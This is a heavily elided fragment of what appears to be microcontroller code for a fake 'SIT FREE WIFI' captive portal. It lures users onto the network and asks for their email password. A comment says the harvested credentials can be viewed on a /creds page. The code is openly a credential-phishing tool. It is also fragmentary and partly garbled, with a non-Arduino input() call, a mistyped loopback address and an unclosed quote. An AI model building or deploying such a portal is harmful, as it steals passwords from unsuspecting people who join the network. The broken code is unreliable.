//captive portal
//follow me on IG not._.jyotishko
...
// User configuration
#define SSID_NAME "SIT FREE WIFI"
#define SUBTITLE "PLEASE CONNECT TO ENJOY HIGH SPEED NET."
...
String posted() {
  ...
  String password = input("enter the password of your email");
...
//AFTER ITS DONE THE CONTROLLER WILL BLINK 3 TIMES
//check passwords in"http://yourcurrentwebsite.com/creds" or "172.0.0.1/creds
}
